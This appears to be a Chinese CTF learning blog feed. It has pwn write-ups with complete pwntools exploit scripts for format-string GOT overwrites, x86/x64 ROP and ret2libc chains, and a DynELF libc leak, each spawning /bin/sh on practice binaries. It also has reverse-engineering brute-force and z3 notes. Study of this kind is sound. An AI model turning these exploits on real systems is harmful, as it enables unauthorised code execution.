No PIE (0x8048000) 有canary保护，感觉现在还不会 分析程序我们去尝试运行，摸清了基本上的程序的功能。12345root@kali:pwn3# ./pwn3 Hello, I'm nao!Please tell me your name... asdNice to meet you, asd :)root@kali:pwn3# 用ida打开看看，发现有system函数，很开心.发现main函数有格式化漏洞123456printf("Please tell me your name... ");if ( getnline((char *)&amp;v6, 64) )&#123; sprintf((char *)&amp;v5, "Nice to meet you, %s :)\n", &amp;v6); result = printf((const char *)&amp;v5);&#125; printf(&amp;v5)这里是格式化漏洞，继续看发现getnline函数12345678910size_t __cdecl getnline(char *s, int n)&#123; char *v3; // [sp+1Ch] [bp-Ch]@1 fgets(s, n, stdin); v3 = strchr(s, 10); if ( v3 ) *v3 = 0; return strlen(s);&#125; strlen(s)这里是计算输入进来字符的长度，只有一个参数，这里是不是很熟悉啊，没错。我们的system函数 也只有一个参数system(s),那么我们可以把将system的plt覆盖到strlen的got，再将参数’/bin/sh’传入，这里我们需要做两件事情1、将strlen_got=system_plt2、回到mian函数，将’/bin/sh’输入，这时就能到达system(‘/bin/sh’) 写exp这里的问题是，格式化执行一次后程序就会退出了，这里了解一下elf程序运行机制，当程序执行main函数前会执行一些准备开始的程序，比如：。初始化节 .init_array 和 .init结束时也会运行一些结束的程序，比如:动态库还可提供终止节。终止节 .fini_array这就意味着我们可以利用终止节回到mian再次执行。查看终止节objdump -s pwn3 |grep fini123root@kali:pwn3# objdump -s pwn3 |grep finiContents of section .fini:Contents of section .fini_array: 发现存在终止节接着利用pwn3直接得到1234systemPlt = elf.plt['system']strlenGot = elf.got['strlen']mainSymbol = elf.symbols['main']finiSymbol = elf.symbols['__do_global_dtors_aux_fini_array_entry'] exp:123456789101112131415161718192021222324from pwn import *elf = ELF('./pwn3')systemPlt = elf.plt['system']strlenGot = elf.got['strlen']mainSymbol = elf.symbols['main']finiSymbol = elf.symbols['__do_global_dtors_aux_fini_array_entry']p = process('./pwn3')#p = remote('127.0.0.1',4004)offset =12writes = &#123;finiSymbol:mainSymbol,strlenGot:systemPlt&#125;padding = 'aa'payload1 = padding + fmtstr_payload(offset = offset,writes = writes,numbwritten = 20,write_size='int')print "payload:len = %d :%s"%(len(payload1),payload1)p.recv()#gdb.attach(p)p.sendline(payload1)sleep(2)p.recvline()payload2 = '/bin/sh'p.sendline(payload2)p.interactive() offset=12为什么是12，这是我手动的，当然pwntools提供了找偏移的个数的函数Fmtstr，12345678910111213root@kali:pwn3# ./pwn3 Hello, I'm nao!Please tell me your name... AAAA%p%p%p%p%p%p%p%p%p%p%p%p%pNice to meet you, AAAA0x80487d00xff8e5e2c(nil)(nil)(nil)(nil)0x6563694e0x206f74200x7465656d0x756f79200x4141202c0x702541410x70257025 :)root@kali:pwn3# ./pwn3 Hello, I'm nao!Please tell me your name... AABBBB%p%p%p%p%p%p%p%p%p%p%p%p%pNice to meet you, AABBBB0x80487d00xfff70c5c(nil)(nil)(nil)(nil)0x6563694e0x206f74200x7465656d0x756f79200x4141202c0x424242420x70257025 :)root@kali:pwn3# ./pwn3 Hello, I'm nao!Please tell me your name... AABBBB%12$pNice to meet you, AABBBB0x42424242 :)root@kali:pwn3# FmtStr和fmtstr_payload函数参考:https://esebanana.github.io/2017/10/09/pwn6/#more 修改exp:上面的那个exp本地运行成功，但如果连上网的话，由于fmtstr_payload函数是产生大量的数据写入，如要写入的地址时0x8040506,那么就会生成0x8040506的无用字符传过去，在本地也需要运行一会儿，在上网根本不行，这里得用字节写入，这里可以参考:https://esebanana.github.io/2017/09/19/pwn3/#more中的修改b,贴上修改后的exp123456789101112131415161718192021222324252627282930313233from pwn import *elf = ELF('./pwn3')systemPlt = elf.plt['system']strlenGot = elf.got['strlen']mainSymbol = elf.symbols['main']finiSymbol = elf.symbols['__do_global_dtors_aux_fini_array_entry']log.info("system:%x\nstrlen:%x\nmain:%x\nfini:%x\n"%(systemPlt,strlenGot,mainSymbol,finiSymbol))p = process('./pwn3')offset =12mainSymbol = 0x080485edfiniSymbol = 0x08049934systemPlt = 0x08048490strlenGot = 0x8049a54payload = 'aa'+p32(0x08049936)+p32(0x08049a56)+p32(0x08049a54)+p32(0x08049934)first = 0x804 - 0x1c - 0x8 #print 0x804 bytes before 0x8049936 second = 0x8490 - 0x0804third = 0x85ed - 0x8490payload += '%' + str(first) + 'x%12$hn'payload += '%13$hn'payload += '%' + str(second) + 'x%14$hn'payload += '%' + str(third) + 'x%15$hn'payload += ""print p.recvuntil('... ')p.sendline(payload)print p.recvuntil('... ')payload2 = '/bin/sh'p.sendline(payload2)p.interactive() 这个exp是两字节写入 FmtStr函数的利用FmtStr函数FmtStr函数可以获取偏移参数的个数offset例如：12345678910111213#include&lt;stdio.h&gt;int main(int argc, char * argv[])&#123; char a[1024]; while(1) &#123; memset(a, '\0', 1024); read(0, a, 1024); printf(a); fflush(stdout); &#125; return 0;&#125; FmtStr函数利用123456789from pwn import *def exec_fmt(payload): p = process('./1') p.sendline(payload) return p.recv()autofmt = FmtStr(exec_fmt)print autofmt.offset 结果：1234567891011root@kali:pwn3# python 1.py [+] Starting local process './1': pid 4859[+] Starting local process './1': pid 4861[+] Starting local process './1': pid 4863[+] Starting local process './1': pid 4865[*] Found format string offset: 44[*] Stopped process './1' (pid 4865)[*] Stopped process './1' (pid 4863)[*] Stopped process './1' (pid 4861)[*] Stopped process './1' (pid 4859) fmtstr_payload函数fmtstr_payload是pwntools提供的函数，用于自动生成格式化字符串。fmtstr_payload有两个参数第一个参数是int，用于表示取参数的偏移个数offset=7第二个参数是字典，字典的意义是往key的地址，写入value的值fmtstr_payload(7, {printf_got: system_add})这个函数调用会往printf_got中写入system_add 文学修养我本楚狂人,凤歌笑孔丘奈何许!天下人何限?慊慊只为汝!]]></content>
      <categories>
        <category>pwn</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PWN_x86中的ROP利用]]></title>
    <url>%2F2017%2F10%2F04%2Fpwn4_rop%2F</url>
    <content type="text"><![CDATA[啥是rop? rop_x86CTF中的ROP顾名思义ROP，就是面向返回语句的编程方法，它借用libc代码段里面的多个retq前的一段指令拼凑成一段有效的逻辑，从而达到攻击的目标。 源码1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void f()&#123; system("no_shell_QQ");&#125;void secure(void)&#123; char buf1[100]; printf("What do you think ?\n"); gets(buf1);&#125;int main(void)&#123; secure(); return 0;&#125; 运行命令生成gcc -m32 -no-pie -fno-stack-protector -z execstack -o pwn2 pwn2.c 漏洞原理，利用rop结合ret2blic技术1、找到system_addr,gets_addr,sh_addr，这些都可以用system_addr=elf.symbols(‘system’)system_plt = elf.symbols[‘system’]get_plt = elf.symbols[‘gets’]sh_addr= elf.bss()2、找到gadgets，也就是利用rop先得到gadgets,这里大神都用ROPGadget，不过我还不会用，我是用objdump,执行以下命令objdump -d ./pwn2 | egrep &#39;ret|pop&#39;结果如下1234567891011121314151617181920218048309: 5b pop %ebx804830a: c3 ret 8048372: 5e pop %esi80483a3: c3 ret 80483d9: f3 c3 repz ret 8048413: f3 c3 repz ret 804843c: f3 c3 repz ret 8048495: c3 ret 80484ce: c3 ret 80484f7: 59 pop %ecx80484f8: 5d pop %ebp80484fc: c3 ret 8048500: c3 ret 8048568: 5b pop %ebx8048569: 5e pop %esi804856a: 5f pop %edi804856b: 5d pop %ebp804856c: c3 ret 8048570: f3 c3 repz ret 8048586: 5b pop %ebx8048587: c3 ret 现在我用最后一个gadgets，pop_ebx=0x8048586 构造payload:payload=’a’*112+p32(get_plt)+p32(pop_ebx)+p32(sh_addr)+p32(system_plt)+p32(1)+p32(sh_addr) p32(get_plt):函数gets的开始地址 ，后面接返回地址[p32(pop_ebx)]，再后面是要写入字符的地址[p32(sh_addr)]p32(pop_ebx):这个gadgets，将栈中他后面一个8字节的数据弹出[p32(sh_addr)],然后运行返回地址[p32(system_plt)]p32(sh_addr):这是bss的地址（可读可写可执行），为了将’\bin\sh’写入这里,也是函数gets[p32(get_plt)]的参数p32(system_plt):这是p32(pop_ebx)函数的返回地址，这里改为我们要执行的system的地址p32(1):system的返回地址，因为用不到，这里我随便填的。p32(sh_addr):system的第一个参数，要执行字符串的地址，我们要拿到shell,就填’/bin/sh’的地址 exp123456789101112from pwn import *p = process('./pwn2')elf = ELF('pwn2')system_plt = elf.symbols['system']get_plt = elf.symbols['gets']sh_addr= elf.bss()pop_ebx= 0x8048586#gdb.attach(p)payload='a'*112+p32(get_plt)+p32(pop_ebx)+p32(sh_addr)+p32(system_plt)+p32(1)+p32(sh_addr)p.sendline(payload)p.sendline('/bin/sh')p.interactive() rop_x64题目-全球某工商的ctf网站上的ctf题（还有源码福利）题目链接：http://pan.baidu.com/s/1dF1Z3e5 密码：jx301234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13); vulnerable_function();&#125; 分析查看文件类型file pwn1发现是64位的，吓我一跳，了解一下x64的特点 x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。如write(rdi,rsi,rdx)先明确目标1、用于任意地址读2、用于任意地址写3、获取shell 可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d ./pwn2观察一下__libc_csu_init()这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。 objdump -d pwn1如下:我们可以看到利用0x4005fa处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005e0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。 那就先来第一步吧，任意地址读，这里我们需要gadget注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。payload1任意地址读1234payload1 = &apos;a&apos;*136payload1 +=p64(0x4005fa)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(raddr)+p64(1)payload1 +=p64(0x4005e0)+&apos;12345678&apos;*7payload1 +=p64(main_addr) 第二步吧，任意地址写12345payload2 = &apos;a&apos;*136print hex(wAddress)payload2 += p64(0x4005fa)+p64(0)+p64(1)+p64(read_got)+p64(8)+p64(wAddress)+p64(0)payload2 += p64(0x4005e0)+&apos;12345678&apos;*7payload2 += p64(main_addr) 第三步吧，获取shell exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *elf=ELF(&apos;pwn1&apos;)so = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)#so=ELF(&apos;libc.so.6&apos;)write_got = elf.got[&apos;write&apos;]read_got = elf.got[&apos;read&apos;]main_addr = elf.symbols[&apos;main&apos;]bssAddr = elf.bss()def leak(raddr): payload = &apos;a&apos;*136 payload +=p64(0x4005fa)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(raddr)+p64(1) payload +=p64(0x4005e0)+&apos;12345678&apos;*7 payload +=p64(main_addr) p.sendline(payload) p.recvuntil(&apos;Hello, World\n&apos;) data = p.recv(8) return datadef arbWrite(wAddress,data): payload2 = &apos;a&apos;*136 print hex(wAddress) payload2 += p64(0x4005fa)+p64(0)+p64(1)+p64(read_got)+p64(8)+p64(wAddress)+p64(0) payload2 += p64(0x4005e0)+&apos;12345678&apos;*7 payload2 += p64(main_addr) p.send(payload2) sleep(2) p.send(data) p = process(&apos;pwn1&apos;)#p = remote(&apos;127.0.0.1&apos;,4001)writeAddr = u64(leak(write_got))print hex(writeAddr)#gdb.attach(p)systemAddr = writeAddr -(so.symbols[&apos;write&apos;]-so.symbols[&apos;system&apos;])sh = writeAddr - (so.symbols[&apos;write&apos;]-next(so.search(&apos;/bin/sh&apos;)))print hex(sh)p.recvuntil(&apos;Hello, World\n&apos;)arbWrite(bssAddr,p64(systemAddr))bss1 = bssAddr+8p.recvuntil(&apos;Hello, World\n&apos;)arbWrite(bss1,&apos;/bin/sh\0&apos;)p.recvuntil(&apos;Hello, World\n&apos;)payload3 = &apos;a&apos;*136payload3 += p64(0x4005fa)+p64(0)+p64(1)+p64(bssAddr)+p64(0)+p64(0)+p64(bss1)payload3 += p64(0x4005e0)+&apos;12345678&apos;*7payload3 += p64(main_addr)p.send(payload3)p.interactive() 这里记录一下我走过的坑，1、首先是第一张4005e6 mov %r15d,%edi，如果bin/sh所在的地址大于4字节，rdi!=edi(这是第一个参数)那么就要过这里，先把bin/sh存放在一个毕竟小的地址，bss段，再将bss地址 传入edi，便可以绕过2、在本地运行时libc.so.6使用自己的，而连接上目标机器使用他给的libc.so.6 DynELF泄露函数地址源码12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123;char buf[128];read(STDIN_FILENO, buf, 256);&#125;int main(int argc, char** argv) &#123;vulnerable_function();write(STDOUT_FILENO, "Hello, World\\n", 13);&#125; 运行命令生成gcc -m32 -no-pie -fno-stack-protector -z execstack -o pwn3 pwn3.c 步骤没有system函数和libc.so1、找到system函数2、将\bin\sh写入bss段3、利用gadgets构造system(‘\bin\sh’),得到shell 漏洞原理，利用pwntools中的DynELF模块来寻找system_addr这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./pwn3’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。这里的leak函数是这样的:123456def leak(address): payload1='a'*140+p32(write_plt)+p32(main)+p32(1)+p32(address)+p32(4) p.send(payload1) data = p.recv(4) print "%#x =&gt; %s" % (address, (data or '').encode('hex')) return data write(fb,addr,len)对应write(p32(1),p32(address),p32(4))p32(write_plt):这是原返回地址，改为write_plt的地址，p32(main)是write_plt的返回地址 ，p32(1)是write_plt的参数1代表读，0代表写，p32(address)是write_plt要读的地址，p32(4)是write_plt要读的字节数 这样就会循环读取函数地址 ,读取地址12345p = process('./pwn3')d = DynELF(leak, elf=ELF('./pwn3'))system_addr = d.lookup('system', 'libc')print "system_addr=" + hex(system_addr) 结果1234567891011121314151617[+] Resolving 'system' in 'libc.so': 0xf7ffd9200x8049f14 =&gt; 010000000x8049f1c =&gt; 0c0000000x8049f24 =&gt; 0d0000000xf7df1000 =&gt; 7f454c460xf7fd2860 =&gt; b03dfaf70xf7df1004 =&gt; 010101030xf7fa3db0 =&gt; 010000000xf7fa3db8 =&gt; 0e000000'''0xf7df2390 =&gt; b50500000xf7df4040 =&gt; 8ae4ee1c0xf7dfaa88 =&gt; 703100000xf7e017d8 =&gt; 737973740xf7e017dc =&gt; 656d00740xf7dfaa8c =&gt; 30ab0300system_addr=0xf7e2bb30 这里我们已经得到system_addr了 构造payload3,得到shell找gadgets利用objdump -d ./pwn3|egrep &quot;pop|ret&quot;12345678910111213141516171819202180482e9: 5b pop %ebx80482ea: c3 ret 8048342: 5e pop %esi8048373: c3 ret 80483a9: f3 c3 repz ret 80483e3: f3 c3 repz ret 804840c: f3 c3 repz ret 804846f: c3 ret 80484ad: 59 pop %ecx80484ae: 5b pop %ebx80484af: 5d pop %ebp80484b3: c3 ret 80484b7: c3 ret 8048518: 5b pop %ebx8048519: 5e pop %esi804851a: 5f pop %edi804851b: 5d pop %ebp804851c: c3 ret 8048520: f3 c3 repz ret 8048536: 5b pop %ebx8048537: c3 ret 因为我们需要pop pop pop ret,这里我选择pppr=0x80484ad12payload2 ='a'*140+p32(plt_read)+p32(pppr)+p32(0)+p32(bss_addr)+p32(8) payload2 += p32(system_addr)+p32(1)+p32(bss_addr) 5、整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:1234567891011121314151617181920212223242526272829from pwn import *elf = ELF('./pwn3')read_plt = elf.plt['read']write_plt=elf.plt['write']main=elf.symbols['main']pppr=0x8048519bss_addr= elf.bss()print hex(bss_addr)def leak(address): payload1='a'*140+p32(write_plt)+p32(main)+p32(1)+p32(address)+p32(4) p.send(payload1) data = p.recv(4) #print "%#x =&gt; %s" % (address, (data or '').encode('hex')) return datap = process('./pwn3')d = DynELF(leak, elf=ELF('./pwn3'))system_addr = d.lookup('system', 'libc')print "system_addr=" + hex(system_addr)#gdb.attach(p)payload2 ='a'*140+p32(read_plt)+p32(pppr)+p32(0)+p32(bss_addr)+p32(8) payload2 += p32(system_addr)+p32(main)+p32(bss_addr)p.send(payload2)p.send("/bin/sh\0")p.interactive() 记录一下自己走过的坑，不知道找gadgets利用的时候pppr=0x80484ad,程序就会莫名的中断 ，调试发现，当跳到0x80484ad这个地址时，程序就退出了。换个pppr=0x8048519，运行成功。可能是 那个gadgets有问题，不知道了，不过可以多换几个试试]]></content>
      <categories>
        <category>pwn</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RE_Windows爆破exe程序]]></title>
    <url>%2F2017%2F10%2F02%2Fre_bp_exe%2F</url>
    <content type="text"><![CDATA[爆破最好的解决方法，z3 求解器是什么？ z3z3的安装不过的我是在虚拟机上安装虚拟环境的：那z3是angr下的一个模板，那就先安装angr,就可以用z3了。1、安装虚拟环境,在一个目录下配置虚拟环境pip install virtualenvwrapper2、配置虚拟环境1234mkdir $HOME/.ven #创建工作目录vim $HOME/.bashrc #编辑启动项 export WORKON_HOME=$HOME/.ven #将这两项添加到文件，开机自动运行 source /usr/share/virtualenvwrapper/virtualenvwrapper.sh #这个不同的机器可能位置不同 find / -name virtualenvwrapper.sh 找到 或者直接运行export WORKON_HOME=$HOME/.vensource /usr/share/virtualenvwrapper/virtualenvwrapper.sh 3、查看虚拟环境1234mkvirtualenv env1 #创建环境workon #列出已有环境deactivate #退出环境rmvirtualenv #删除环境 4、安装angr12mkvirtualenv angrpip install angr z3求解器是什么？z3是由微软公司开发的一个优秀的SMT求解器（也就定理证明器），它能够检查逻辑表达式的可满足性通俗讲，就是解方程。比如使用z3解二元一次方程：利用z3约束求解x-y == 33x-8y == 412345678from z3 import *x = Int('x')y = Int('y')solver = Solver()solver.add(x-y == 3)solver.add(3*x-8*y == 4)if solver.check() == sat: print solver.model() angr它是一个易用的二进制分析套件，可以用于做动态符号执行和多种静态分析，现在来简单记录一下它的用法。详细的文档可以看这里。符号执行 （Symbolic Execution）是一种程序分析技术。其可以通过分析程序来得到让特定代码区域执行的输入。使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。[1]符号模拟技术（symbolic simulation）则把类似的思想用于硬件分析。符号计算（Symbolic computation）则用于数学表达式分析。angr功能很强大，需要多多练习。 windows爆破1、windows爆破exe直接看代码，以后可能用到，就记录下来123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# -*- coding: utf8 -*-import subprocessimport threadingserial='78767-77666-76786-87788-77778-66867-66777-86767-66877-77778-88887''''##得到flag的字典dic = '_qwertyuiopasdfghjklzxcvbnm'name = []with open('dic.txt','w') as f: for i in dic: for j in dic: for k in dic: for l in dic: f.writelines('&#123;hdu'+i+'b'+j+k+l+'0_&#125;\n')'''def crack(source): p = subprocess.Popen(pname, stdin=subprocess.PIPE, stdout=subprocess.PIPE) result = p.communicate(input=source) res=result[0] if ('Sorry' in res): return else: print source exit()dic = []with open('dic.txt', 'r') as f: for eachline in f.readlines(): dic.append(eachline)##pname = 'myproject1.exe'pname = 'crackme.exe'##a = '123'+' '+'123'threads = []for i in dic: source = i + ' ' + serial t = threading.Thread(target = crack, args=(source,)) threads.append(t)num = 0for t in threads: t.start() while True: #判断正在运行的线程数量,如果小于5则退出while循环, #进入for循环启动新的进程.否则就一直在while循环进入死循环 if(len(threading.enumerate()) &lt; 20): break 移位密码爆破123456789101112131415161718192021222324#coding=utf-8import relist1 = []s = "d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd"result = "0x" + re.sub(r"(?&lt;=\w)(?=(?:\w\w)+$)", "0x", s)for i in range(len(result)): if (i + 1) % 4 == 0: list1.append(result[(i - 3):(i + 1)]) else: continuefor j in range(129): l=[] for i in range(len(list1)): l.append(chr(int(list1[i],16) - j)) k=''.join(l) if "DDCTF" in k: print k print j if "ddctf" in k: print k print j 某秋的比赛打ctf，怀疑自己到疯，代码不会写，这里记录一下，以后方便用到 1、花指令6789abcd –&gt; 3637383961626364 -&gt;6789abcdhttps://www.bejson.com/convert/ox2str/ b=’66778899’ –&gt; [0x66,0x77,0x88,0x99]1234567891011121314151617def fen(b): k = len(b) n=[] for i in range(len(b)-6): if i%6==0: n.append(b[i]+b[i+1]) n.append(b[i+2]+b[i+3]) n.append(b[i+4]+b[i+5]) i = i + 6 n.append(b[k - 6] + b[k - 5]) n.append(b[k - 4] + b[k - 3]) n.append(b[k - 2] + b[k - 1]) k = [] for i in range(len(n)): k.append(hex(int(n[i], 16))) return k 最后附上，自己的juckcode.代码思路1234567891011121314151617181920212223242526272829303132flag + base64k=flag+0x40 +base64flag=(k*7)%256flag=(flag+0x40) *7)%256算法1ZpYA mqmA 9+LC大写-0x41小写-0x47数字+0x4+ 0x13 7a z 61 a 33-1a5a Z 40 A 19-00shuz 0-9 34-3d3e 3e-13 算法2第一位 第二位第三位a1=0x2ca2=0x30a3=0x2ca4=0a1=0x19a2=0x29a3=0x18a4=0k=a1*4+(a2&amp;0x30)/16print kk=(a3&amp;0x3c)/4+(a2&amp;0x0f)*16print kk=((a3&amp;0x03)*2**6)%256+a4print k 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#coding:utf-8import base64#分解flag_encc1=[]# def fen():# a = &apos;FFIF@@IqqIH@sGBBsBHFAHH@FFIuB@tvrrHHrFuBD@qqqHH@GFtuB@EIqrHHCDuBsBqurHH@EuGuB@trqrHHCDuBsBruvHH@FFIF@@AHqrHHEEFBsBGtvHH@FBHuB@trqrHHADFBD@rquHH@FurF@@IqqrHHvGuBD@tCDHH@EuGuB@tvrrHHCDuBD@tCDHH@FuruB@tvrIH@@DBBsBGtvHH@GquuB@EIqrHHvGuBsBtGEHH@EuGuB@tvrIH@BDqBsBIFEHH@GFtF@@IqqrHHEEFBD@srBHH@GBsuB@trqrHHIFFBD@rquHH@FFIuB@tvrrHHtCDB@@&apos;# for i in a:# c.append(chr(ord(i) - 16))# b = &quot;&quot;.join(c)# k = len(b)# print b# for i in range(len(b)-6):# if i%6==0:# n.append(b[i]+b[i+1])# n.append(b[i+2]+b[i+3])# n.append(b[i+4]+b[i+5])# i = i + 6# n.append(b[k - 6] + b[k - 5])# n.append(b[k - 4] + b[k - 3])# n.append(b[k - 2] + b[k - 1])## print n#匹配字符def bp(): # n=[&apos;66&apos;, &apos;96&apos;, &apos;00&apos;, &apos;9a&apos;, &apos;a9&apos;, &apos;80&apos;, &apos;c7&apos;, &apos;22&apos;, &apos;c2&apos;, &apos;86&apos;, &apos;18&apos;, &apos;80&apos;, &apos;66&apos;, &apos;9e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;bb&apos;, &apos;88&apos;, &apos;b6&apos;, &apos;e2&apos;, &apos;40&apos;, &apos;aa&apos;, &apos;a8&apos;, &apos;80&apos;, &apos;76&apos;, &apos;de&apos;, &apos;20&apos;, &apos;59&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;34&apos;, &apos;e2&apos;, &apos;c2&apos;, &apos;ae&apos;, &apos;b8&apos;, &apos;80&apos;, &apos;5e&apos;, &apos;7e&apos;, &apos;20&apos;, &apos;db&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;34&apos;, &apos;e2&apos;, &apos;c2&apos;, &apos;be&apos;, &apos;f8&apos;, &apos;80&apos;, &apos;66&apos;, &apos;96&apos;, &apos;00&apos;, &apos;18&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;55&apos;, &apos;62&apos;, &apos;c2&apos;, &apos;7d&apos;, &apos;f8&apos;, &apos;80&apos;, &apos;62&apos;, &apos;8e&apos;, &apos;20&apos;, &apos;db&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;14&apos;, &apos;62&apos;, &apos;40&apos;, &apos;ba&apos;, &apos;e8&apos;, &apos;80&apos;, &apos;6e&apos;, &apos;b6&apos;, &apos;00&apos;, &apos;9a&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;f7&apos;, &apos;e2&apos;, &apos;40&apos;, &apos;d3&apos;, &apos;48&apos;, &apos;80&apos;, &apos;5e&apos;, &apos;7e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;bb&apos;, &apos;88&apos;, &apos;34&apos;, &apos;e2&apos;, &apos;40&apos;, &apos;d3&apos;, &apos;48&apos;, &apos;80&apos;, &apos;6e&apos;, &apos;be&apos;, &apos;20&apos;, &apos;df&apos;, &apos;b9&apos;, &apos;80&apos;, &apos;04&apos;, &apos;22&apos;, &apos;c2&apos;, &apos;7d&apos;, &apos;f8&apos;, &apos;80&apos;, &apos;7a&apos;, &apos;ee&apos;, &apos;20&apos;, &apos;59&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;f7&apos;, &apos;e2&apos;, &apos;c2&apos;, &apos;d7&apos;, &apos;58&apos;, &apos;80&apos;, &apos;5e&apos;, &apos;7e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;b9&apos;, &apos;80&apos;, &apos;24&apos;, &apos;a2&apos;, &apos;c2&apos;, &apos;96&apos;, &apos;58&apos;, &apos;80&apos;, &apos;76&apos;, &apos;d6&apos;, &apos;00&apos;, &apos;9a&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;55&apos;, &apos;62&apos;, &apos;40&apos;, &apos;cb&apos;, &apos;28&apos;, &apos;80&apos;, &apos;72&apos;, &apos;ce&apos;, &apos;20&apos;, &apos;db&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;96&apos;, &apos;62&apos;, &apos;40&apos;, &apos;ba&apos;, &apos;e8&apos;, &apos;80&apos;, &apos;66&apos;, &apos;9e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;bb&apos;, &apos;88&apos;, &apos;d3&apos;, &apos;42&apos;, &apos;00&apos;] # k=len(n) # print k # for i in range(len(n)-3): # if i % 3 == 0: # k1=int(n[i], 16) # k2=int(n[i+1], 16) # k3=int(n[i+2], 16) # print i,hex(k1),hex(k2),hex(k3) # bp1(k1, k2, k3) # # k1 = int(int(n[k-3], 16)) # k2 = int(int(n[k-2], 16)) # k3 = int(int(n[k-1], 16)) # bp1(k1, k2, k3) q=[] c1=[90, 109, 120, 104, 90, 51, 116, 113, 100, 87, 78, 114, 88, 50, 78, 118, 90, 71, 86, 102, 89, 50, 70, 117, 98, 109, 48, 88, 51, 78, 48, 98, 51, 66, 102, 101, 87, 49, 88, 51, 74, 108, 100, 109, 86, 121, 99, 50, 108, 117, 90, 51, 48] print c1 for i in range(len(c1)): q.append(chr(c1[i])) print &quot;&quot;.join(q)def bp1(k1,k2,k3): begin = 0x2f - 0x41 end = 0x7a - 0x41 ll = 0 for a1 in range(begin, end): if ll == 1: break; for a2 in range(begin, end): if ll == 1: break; for a3 in range(begin, end): if ll == 1: break; for a4 in range(begin, end): if (a1 * 4 + (a2 &amp; 0x30) / 16 == k1) and ((a3 &amp; 0x3c) / 4 + (a2 &amp; 0x0f) * 16 == k2) and ( ((a3 &amp; 0x03) * 2 ** 6) % 256 + a4 == k3): ll = 1 k = int(hex(a1), 16) k=pandun(k) print chr(k) c1.append(chr(k)) break;def pandun(x1): if (x1&gt;=0)and(x1&lt;=0x19): x1=int(x1)+0x41 elif (x1&gt;=0x1a)and(x1&lt;=0x33): x1 = int(x1) + 0x47 elif (x1&gt;=0x34)and(x1&lt;=0x3d): x1=int(x1)-0x4 else: x1=int(x1)-0x13 return x1def test(): a1 = 0x2c a2 = 0x30 a3 = 0x2c a4 = 0 k = a1 * 4 + (a2 &amp; 0x30) / 16 print hex(k) k = (a3 &amp; 0x3c) / 4 + (a2 &amp; 0x0f) * 16 print hex(k) k = ((a3 &amp; 0x03) * 2 ** 6) % 256 + a4 print hex(k)if __name__ == &apos;__main__&apos;: bp() 